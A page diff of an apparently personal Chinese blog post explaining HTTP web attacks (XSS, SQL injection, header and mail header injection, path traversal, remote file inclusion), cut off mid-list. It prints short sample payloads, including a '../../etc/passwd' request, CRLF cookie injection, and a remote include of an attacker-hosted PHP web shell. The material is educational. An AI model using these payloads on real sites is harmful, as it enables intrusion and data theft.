@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Front-end">
+    <meta name="keyword" content="mslinzz,frontend,web,js,javascript,html,html5,css,css3,less,sass,boostrap,php,laravel,codeIginter,ci,git,sourcetree">
+    <link rel="shortcut icon" href="/img/favicon16.ico">
+
+    <title>
+        
+            Take a great notice on the Web Attack via HTTP. - Linzhenzhen的博客 | Linzhenzhen&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://linzhenzhen.github.io/2017/08/02/http-web-attack/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <!--<link href="http://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">-->
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">
+                <img src="/img/plum-blossom.png" alt="Zhenzhen Lin">
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li><a href="/"> Home </a></li>
+                    
+                    
+                    
+                    
+                    <li><a href="/about/"> About </a></li>
+                    
+                    
+                    
+                    <li><a href="/tags/"> Tags </a></li>
+                    
+                    
+                    
+                    <li><a href="/archive/"> Archives </a></li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://linzhenzhen.github.io /img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/bg-home.jpg')
+    }
+</style>
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-10 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#HTTP"
+                           title="HTTP">HTTP</a>
+                        
+                    </div>
+                    <h1>Take a great notice on the Web Attack via HTTP.</h1>
+                    <h2 class="subheading">基于 HTTP 的Web网站的攻击技术</h2>
+                    <span class="meta">
+                        Posted by mslinzz on
+                        2017-08-02
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <blockquote>
+<p>&#x524D;&#x8A00;</p>
+</blockquote>
+<p>&#x7EE7;&#x4E0A;&#x4E00;&#x7BC7;<a href="http://linzhenzhen.github.io/2017/07/31/http-sth/">A little bit of HTTP sth sth.</a>&#x4E4B;&#x540E;, &#x628A;Web&#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;&#x4E5F;&#x5728;&#x6B64;&#x505A;&#x4E2A;&#x8BB0;&#x5F55;. &#x8BB0;&#x5F55;&#x54EA;&#x4E9B;&#x653B;&#x51FB; Web &#x7AD9;&#x70B9;&#x7684;&#x624B;&#x6BB5;, &#x4EE5;&#x53CA;&#x653B;&#x51FB;&#x4F1A;&#x9020;&#x6210;&#x600E;&#x4E48;&#x6837;&#x7684;&#x5F71;&#x54CD;.</p>
+<blockquote>
+<p>&#x9488;&#x5BF9; Web &#x7684;&#x653B;&#x51FB;&#x6280;&#x672F;</p>
+</blockquote>
+<p>1.HTTP&#x4E0D;&#x5177;&#x5907;&#x5FC5;&#x8981;&#x7684;&#x5B89;&#x5168;&#x529F;&#x80FD;&#x6216;&#x8005;&#x52A0;&#x5BC6;&#x6280;&#x672F;&#x7B49;&#x5B89;&#x5168;&#x5904;&#x7406;.</p>
+<p>2.&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5373;&#x53EF;&#x7BE1;&#x6539;&#x8BF7;&#x6C42;. &#x5728; Web &#x5E94;&#x7528;&#x4E2D;, &#x4ECE;&#x6D4F;&#x89C8;&#x5668;&#x63A5;&#x53D7;&#x5230;&#x7684; HTTP &#x8BF7;&#x6C42;&#x4E2D;&#x7684;&#x5168;&#x90E8;&#x5185;&#x5BB9;, &#x90FD;&#x53EF;&#x4EE5;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x81EA;&#x7531;&#x53D8;&#x66F4;, &#x7BE1;&#x6539;. &#x5728; HTTP &#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x5185;&#x52A0;&#x8F7D;&#x653B;&#x51FB;&#x4EE3;&#x7801;, &#x5C31;&#x80FD;&#x53D1;&#x8D77;&#x5BF9; Web &#x5E94;&#x7528;&#x7684;&#x653B;&#x51FB;.</p>
+<p>3.&#x9488;&#x5BF9; Web &#x7684;&#x653B;&#x51FB;&#x6A21;&#x5F0F;&#x5206;&#x4E3A;: &#x4E3B;&#x52A8;&#x653B;&#x51FB;&#x548C;&#x88AB;&#x52A8;&#x653B;&#x51FB;.</p>
+<p><code>&#x4E3B;&#x52A8;&#x653B;&#x51FB;</code>(active attack)&#x662F;&#x6307;&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x8BBF;&#x95EE; Web &#x5E94;&#x7528;, &#x628A;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x4F20;&#x5165;&#x7684;&#x653B;&#x51FB;&#x6A21;&#x5F0F;, &#x4F46;&#x9700;&#x8981;&#x653B;&#x51FB;&#x8005;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D44;&#x6E90;.</p>
+<p><code>&#x88AB;&#x52A8;&#x653B;&#x51FB;</code>(passive attack)&#x662F;&#x6307;&#x5229;&#x7528;&#x5708;&#x5957;&#x6216;&#x5236;&#x4F5C;&#x8BF1;&#x9975;&#x7B56;&#x7565;&#x6267;&#x884C;&#x653B;&#x51FB;&#x4EE3;&#x7801;&#x7684;&#x653B;&#x51FB;&#x6A21;&#x5F0F;. &#x6216;&#x8005;&#x8BF4;, &#x653B;&#x51FB;&#x8005;&#x4E0D;&#x76F4;&#x63A5;&#x5BF9;&#x76EE;&#x6807; Web &#x5E94;&#x7528;&#x8BBF;&#x95EE;&#x53D1;&#x8D77;&#x653B;&#x51FB;.</p>
+<blockquote>
+<p>&#x56E0;&#x8F93;&#x51FA;&#x503C;&#x8F6C;&#x4E49;&#x4E0D;&#x5B8C;&#x5168;&#x5F15;&#x53D1;&#x7684;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;</p>
+</blockquote>
+<p>&#x4E00;&#x822C; Web &#x5E94;&#x7528;&#x7684;&#x5B89;&#x5168;&#x5BF9;&#x7B56;&#x53EF;&#x770B;&#x505A;&#x662F;&#x4EE5;&#x4E0B;&#x4E24;&#x4E2A;&#x90E8;&#x5206;:</p>
+<ul>
+<li>&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x9A8C;&#x8BC1;</li>
+<li>&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7684;&#x9A8C;&#x8BC1;: &#x8F93;&#x5165;&#x503C;&#x9A8C;&#x8BC1;, &#x8F93;&#x5165;&#x503C;&#x8F6C;&#x4E49;</li>
+</ul>
+<p><code>1.&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;</code></p>
+<p>&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;(Cross-Site Scripting, XSS)&#x662F;&#x6307;&#x901A;&#x8FC7;&#x5B58;&#x5728;&#x7684;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x7684; Web &#x7F51;&#x7AD9;&#x6CE8;&#x518C;&#x7528;&#x6237;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x8FD0;&#x884C;&#x975E;&#x6CD5;&#x7684; HTML &#x6807;&#x7B7E;&#x6216; JavaScript &#x8FDB;&#x884C;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;. &#x52A8;&#x6001;&#x521B;&#x5EFA;&#x7684; HTML &#x90E8;&#x5206;&#x6709;&#x53EF;&#x80FD;&#x9690;&#x85CF;&#x7740;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;, &#x5C31;&#x8FD9;&#x6837;&#x653B;&#x51FB;&#x8005;&#x7F16;&#x5199;&#x811A;&#x672C;&#x8BBE;&#x7F6E;&#x9677;&#x9631;, &#x7528;&#x6237;&#x5728;&#x4E0D;&#x7ECF;&#x610F;&#x95F4;&#x64CD;&#x4F5C;&#x4E4B;&#x540E;&#x5C31;&#x4F1A;&#x53D7;&#x5230;&#x88AB;&#x52A8;&#x653B;&#x51FB;.</p>
+<p>&#x53EF;&#x80FD;&#x9020;&#x6210;&#x7684;&#x5F71;&#x54CD;:</p>
+<ul>
+<li>&#x5229;&#x7528;&#x865A;&#x5047;&#x8F93;&#x5165;&#x8868;&#x5355;&#x9A97;&#x53D6;&#x7528;&#x6237;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;.</li>
+<li>&#x5229;&#x7528;&#x811A;&#x672C;&#x7A83;&#x53D6;&#x7528;&#x6237;&#x7684; Cookie &#x503C;, &#x88AB;&#x5BB3;&#x8005;&#x5728;&#x4E0D;&#x77E5;&#x60C5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;, &#x5E2E;&#x52A9;&#x653B;&#x51FB;&#x8005;&#x53D1;&#x9001;&#x6076;&#x610F;&#x8BF7;&#x6C42;.</li>
+<li>&#x663E;&#x793A;&#x4F2A;&#x9020;&#x7684;&#x6587;&#x7AE0;&#x6216;&#x56FE;&#x7247;.</li>
+</ul>
+<p><code>2.SQL&#x6CE8;&#x5165;&#x653B;&#x51FB;</code></p>
+<p>SQL&#x6CE8;&#x5165;&#x653B;&#x51FB;(SQL Injection)&#x662F;&#x6307;&#x9488;&#x5BF9; Web &#x5E94;&#x7528;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;, &#x901A;&#x8FC7;&#x8FD0;&#x884C;&#x975E;&#x6CD5;&#x7684; SQL &#x800C;&#x4EA7;&#x751F;&#x7684;&#x653B;&#x51FB;.</p>
+<p>&#x53EF;&#x80FD;&#x9020;&#x6210;&#x7684;&#x5F71;&#x54CD;:</p>
+<ul>
+<li>&#x975E;&#x6CD5;&#x67E5;&#x770B;&#x6216;&#x7BE1;&#x6539;&#x6570;&#x636E;&#x5E93;&#x5185;&#x7684;&#x6570;&#x636E;</li>
+<li>&#x89C4;&#x907F;&#x8BA4;&#x8BC1;</li>
+<li>&#x6267;&#x884C;&#x548C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E1A;&#x52A1;&#x5173;&#x8054;&#x7684;&#x7A0B;&#x5E8F;&#x7B49;</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// &#x6B63;&#x5E38;&#x7B80;&#x5355;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x6848;&#x4F8B;</span></div><div class="line">SELECT * FROM book WHERE author = <span class="string">&apos;mslinzz&apos;</span> and falg = <span class="number">1</span>;</div><div class="line"></div><div class="line"><span class="comment">// &#x52A0;&#x5165;&#x653B;&#x51FB;&#x7684;&#x8BED;&#x53E5;</span></div><div class="line">SELECT * FROM book WHERE author = <span class="string">&apos;mslinzz&apos;</span> --<span class="string">&apos; and falg = 1;</span></div></pre></td></tr></table></figure>
+<p>&#x4E0A;&#x8FF0;&#x653B;&#x51FB;&#x6848;&#x4F8B;&#x4E2D;, &#x653B;&#x51FB;&#x4E4B;&#x540E;&#x7684;&#x8BED;&#x53E5;&#x5728;&#x83B7;&#x53D6;&#x7684;&#x67E5;&#x8BE2;&#x5B57;&#x7B26;&#x4E32;&#x540E;&#x8FFD;&#x52A0;&#x4E86; <code>&apos; --</code> &#x8FD9;&#x51E0;&#x4E2A;&#x5B57;&#x7B26;, <code>--</code> &#x4E4B;&#x540E;&#x7684;&#x5185;&#x5BB9;&#x91CA;&#x4E3A;&#x6CE8;&#x91CA;, &#x6240;&#x4EE5;&#x4E4B;&#x540E;&#x7684;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;&#x5219;&#x65E0;&#x6548;&#x4E86;.</p>
+<p><code>3.OS &#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x653B;&#x51FB;</code></p>
+<p>OS &#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x653B;&#x51FB;(OS Command Injection)&#x662F;&#x6307;&#x901A;&#x8FC7; Web &#x5E94;&#x7528;, &#x6267;&#x884C;&#x975E;&#x6CD5;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x8FBE;&#x5230;&#x653B;&#x51FB;&#x7684;&#x76EE;&#x7684;. &#x53EA;&#x8981;&#x5728;&#x80FD;&#x8C03;&#x7528; Shell &#x7684;&#x5730;&#x65B9;&#x5C31;&#x4F1A;&#x5B58;&#x5728;&#x653B;&#x51FB;&#x7684;&#x98CE;&#x9669;.</p>
+<p><code>4.HTTP &#x9996;&#x90E8;&#x6CE8;&#x5165;&#x653B;&#x51FB;</code></p>
+<p>HTTP &#x9996;&#x90E8;&#x6CE8;&#x5165;&#x653B;&#x51FB;(HTTP Header Injection)&#x662F;&#x6307;&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x5728;&#x54CD;&#x5E94;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x5185;&#x63D2;&#x5165;&#x6362;&#x884C;, &#x6DFB;&#x52A0;&#x4EFB;&#x610F;&#x54CD;&#x5E94;&#x9996;&#x90E8;&#x6216;&#x4E3B;&#x4F53;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;. &#x5C5E;&#x4E8E;&#x88AB;&#x52A8;&#x653B;&#x51FB;.</p>
+<p>&#x53EF;&#x80FD;&#x9020;&#x6210;&#x7684;&#x5F71;&#x54CD;:</p>
+<ul>
+<li>&#x8BBE;&#x7F6E;&#x4EFB;&#x4F55; Cookie &#x4FE1;&#x606F;</li>
+<li>&#x91CD;&#x5B9A;&#x5411;&#x81F3;&#x4EFB;&#x610F; URL</li>
+<li>&#x663E;&#x793A;&#x4EFB;&#x610F;&#x7684;&#x4E3B;&#x4F53;(HTTP &#x54CD;&#x5E94;&#x622A;&#x65AD;&#x653B;&#x51FB;)</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// &#x6B64;&#x5904;&#x662F;&#x4E00;&#x4E2A;&#x6B63;&#x5E38;&#x8BF7;&#x6C42;</span></div><div class="line">http:<span class="comment">//example.com/a.cgi?q=101</span></div><div class="line"></div><div class="line"><span class="comment">// &#x6B64;&#x5904;&#x662F;&#x88AB;&#x653B;&#x51FB;&#x4E4B;&#x540E;&#x7684;&#x8BF7;&#x6C42;</span></div><div class="line">http:<span class="comment">//example.com/a.cgi?q=101%0D%0ASet-Cookie:+SID=12345</span></div></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// &#x6B21;&#x6570;&#x662F;&#x8BF7;&#x6C42;&#x4E2D;&#x7684;&#x62A5;&#x6587;&#x4E00;&#x90E8;&#x5206;</span></div><div class="line">Locaion: http:<span class="comment">//example.com/a.cgi?q=101</span></div><div class="line"><span class="built_in">Set</span>-cookie: SID=<span class="number">12345</span></div></pre></td></tr></table></figure>
+<p>&#x4E0A;&#x8FF0;Set-cookie: SID=12345&#x5C31;&#x662F;&#x63D2;&#x5165;&#x7684;&#x503C;, &#x56E0; <code>%0D%0A</code> &#x4EE3;&#x8868;HTTP&#x62A5;&#x6587;&#x4E2D;&#x7684;&#x6362;&#x884C;&#x7B26;, &#x6B64;&#x65F6;&#x653B;&#x51FB;&#x8005;&#x7F51;&#x7AD9;&#x7684;&#x4F1A;&#x8BDD;ID&#x5F3A;&#x5236;&#x8BBE;&#x7F6E;&#x6210; SID=12345.</p>
+<p>&#x50CF;&#x4E0A;&#x5904;&#x6848;&#x4F8B;, &#x8FD8;&#x6709; <code>HTTP &#x54CD;&#x5E94;&#x622A;&#x65AD;&#x653B;&#x51FB;</code>, &#x5982;:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// &#x8BF7;&#x6C42;&#x653B;&#x51FB;&#x5B57;&#x7B26;&#x4E32;</span></div><div class="line">%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;&#x4E4B;&#x540E;, &#x5199;&#x5165;&#x7F51;&#x9875;&#x7684;&#x5185;&#x5BB9; &lt;!--</div></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// &#x88AB;&#x653B;&#x51FB;&#x4E4B;&#x540E;&#x7684;&#x8BF7;&#x6C42;&#x9996;&#x90E8;</span></div><div class="line"><span class="built_in">Set</span>-cookie: SID=(%<span class="number">0</span>D%<span class="number">0</span>A: &#x6362;&#x884C;&#x7B26;)</div><div class="line">(%<span class="number">0</span>D%<span class="number">0</span>A: &#x6362;&#x884C;&#x7B26;)</div><div class="line">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;&#x4E4B;&#x540E;, &#x5199;&#x5165;&#x7F51;&#x9875;&#x7684;&#x5185;&#x5BB9; &lt;!-- (&#x8FD9;&#x91CC;&#x539F;&#x6765;&#x7684;&#x9996;&#x90E8;&#x4F1A;&#x88AB;&#x6CE8;&#x91CA;)</div></pre></td></tr></table></figure>
+<p><code>5.&#x90AE;&#x4EF6;&#x9996;&#x90E8;&#x6CE8;&#x5165;&#x653B;&#x51FB;</code></p>
+<p>&#x90AE;&#x4EF6;&#x9996;&#x90E8;&#x6CE8;&#x5165;(Mail Header Injection)&#x662F;&#x6307; Web &#x5E94;&#x7528;&#x4E2D;&#x7684;&#x90AE;&#x4EF6;&#x53D1;&#x9001;&#x529F;&#x80FD;, &#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x5411;&#x90AE;&#x4EF6;&#x9996;&#x90E8; To &#x6216; Subject &#x5185;&#x4EFB;&#x610F;&#x6DFB;&#x52A0;&#x975E;&#x6CD5;&#x5185;&#x5BB9;&#x53D1;&#x8D77;&#x7684;&#x653B;&#x51FB;. &#x5229;&#x7528;&#x5B58;&#x5728;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x7684; Web &#x7F51;&#x7AD9;, &#x53EF;&#x5BF9;&#x4EFB;&#x610F;&#x90AE;&#x4EF6;&#x5730;&#x5740;&#x53D1;&#x9001;&#x5E7F;&#x544A;&#x90AE;&#x4EF6;&#x6216;&#x75C5;&#x6BD2;&#x90AE;&#x4EF6;. &#x5982;&#x4E0B;:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//%0D0A &#x6362;&#x884C;&#x7B26; Bcc&#x90AE;&#x4EF6;&#x8FFD;&#x52A0;&#x4E86;&#x53D1;&#x9001;</span></div><div class="line">bob@hackr.jp%<span class="number">0</span>D%<span class="number">0</span>ABcc:user@exmaple.com</div></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//%0D%0A%0D%0A &#x4E24;&#x4E2A;&#x6362;&#x884C;&#x7B26;&#x53EF;&#x80FD;&#x7BE1;&#x6539;&#x90AE;&#x4EF6;&#x5185;&#x5BB9;&#x5E76;&#x53D1;&#x9001;</span></div><div class="line">bob@hackr.jp%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>ATest Message</div></pre></td></tr></table></figure>
+<p><code>6.&#x76EE;&#x5F55;&#x904D;&#x5386;&#x653B;&#x51FB;</code></p>
+<p>&#x76EE;&#x5F55;&#x904D;&#x5386;(Directory Traversal)&#x653B;&#x51FB;&#x662F;&#x6307;&#x5BF9;&#x672C;&#x65E0;&#x610F;&#x516C;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x76EE;&#x5F55;, &#x901A;&#x8FC7;&#x975E;&#x6CD5;&#x622A;&#x65AD;&#x5176;&#x76EE;&#x5F55;&#x8DEF;&#x5F84;&#x540E;, &#x8FBE;&#x6210;&#x8BBF;&#x95EE;&#x76EE;&#x7684;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;. &#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x6709;&#x65F6;&#x4E5F;&#x79F0;&#x8DEF;&#x5F84;&#x904D;&#x5386;(Path Traversal)&#x653B;&#x51FB;. &#x5982;&#x4E0B;:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// &#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#x67D0;&#x4E2A;log&#x65E5;&#x5FD7;</span></div><div class="line">http:<span class="comment">//example.com/read.php?log=0401.log</span></div><div class="line"></div><div class="line"><span class="comment">// &#x653B;&#x51FB;&#x8005;&#x8BBF;&#x95EE;&#x67D0;&#x4E2A;&#x8BF7;&#x6C42;</span></div><div class="line">http:<span class="comment">//example.com/read.php?log=../../etc/passwd</span></div></pre></td></tr></table></figure>
+<p><code>7.&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;</code></p>
+<p>&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;(Remote File Inclusion)&#x662F;&#x6307;&#x5F53;&#x90E8;&#x5206;&#x811A;&#x672C;&#x5185;&#x5BB9;&#x9700;&#x8981;&#x4ECE;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x8BFB;&#x5165;&#x65F6;, &#x653B;&#x51FB;&#x8005;&#x5229;&#x7528;&#x6307;&#x5B9A;&#x5916;&#x90E8;&#x670D;&#x52A1;&#x5668;&#x7684; URL &#x5145;&#x5F53;&#x4F9D;&#x8D56;&#x6587;&#x4EF6;, &#x8BA9;&#x811A;&#x672C;&#x8BFB;&#x53D6;&#x4E4B;&#x540E;, &#x5C31;&#x53EF;&#x8FD0;&#x884C;&#x4EFB;&#x610F;&#x811A;&#x672C;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;.</p>
+<p>&#x8FD9;&#x4E3B;&#x8981;&#x662F; PHP &#x5B58;&#x5728;&#x7684;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;, &#x5BF9; PHP &#x7684; include &#x6216; require &#x6765;&#x8BF4;, &#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x53EF;&#x901A;&#x8FC7;&#x8BBE;&#x5B9A;, &#x6307;&#x5B9A;&#x5916;&#x90E8;&#x670D;&#x52A1;&#x5668;&#x7684; URL &#x4F5C;&#x4E3A;&#x6587;&#x4EF6;&#x540D;&#x7684;&#x529F;&#x80FD;. &#x4F46;&#x662F;, &#x8BE5;&#x529F;&#x80FD;&#x592A;&#x5371;&#x9669;, PHP5.2.0 &#x4E4B;&#x540E;&#x9ED8;&#x8BA4;&#x8BBE;&#x5B9A;&#x6B64;&#x529F;&#x80FD;&#x65E0;&#x6548;&#x4E86;.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// http://exmaple.com/foo.php?mod=news.php  &#x4E2D;&#x7684;&#x4E00;&#x90E8;&#x5206;&#x4EE3;&#x7801;</span></div><div class="line"></div><div class="line">$modname = $_GET[<span class="string">&apos;mod&apos;</span>];</div><div class="line">include($modname);</div></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// http://exmaple.com/foo.php?mod=http://hackr.jp/cmd.php&amp;cmd=ls &#x653B;&#x51FB;&#x8005;&#x7684;&#x8BF7;&#x6C42;</span></div><div class="line"><span class="comment">// &#x4EE5;&#x4E0B;&#x662F;&#x653B;&#x51FB;&#x8005;&#x5199;&#x597D;&#x7684;&#x6587;&#x4EF6; http://hackr.jp/cmd.php</span></div><div class="line"></div><div class="line">&lt;? system($_GET[<span class="string">&apos;cmd&apos;</span>]); ?&gt;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>&#x56E0;&#x8BBE;&#x7F6E;&#x6216;&#x8BBE;&#x8BA1;&#x4E0A;&#x7684;&#x7F3A;&#x9677;&#x5F15;&#x53D1;&#x7684;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;</p>
+</blockquote>
+<p><code>1.&#x5F3A;&#x5236;&#x6D4F;&#x89C8;</code></p>
+<p>&#x5F3A;&#x5236;&#x6D4F;&#x89C8;(Forced Browsing)&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x662F;&#x6307;, &#x4ECE;&#x5B89;&#x7F6E;&#x5728; Web &#x670D;&#x52A1;&#x5668;&#x7684;&#x516C;&#x5F00;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x4E2D;, &#x6D4F;&#x89C8;&#x90A3;&#x4E9B;&#x539F;&#x672C;&#x975E;&#x81EA;&#x613F;&#x516C;&#x5F00;&#x7684;&#x6587;&#x4EF6;.</p>
+<p>&#x53EF;&#x80FD;&#x9020;&#x6210;&#x7684;&#x5F71;&#x54CD;:</p>
+<ul>
+<li>&#x6CC4;&#x6F0F;&#x987E;&#x5BA2;&#x7684;&#x4E2A;&#x4EBA;&#x4FE1;&#x606F;&#x7B49;&#x91CD;&#x8981;&#x60C5;&#x62A5;</li>
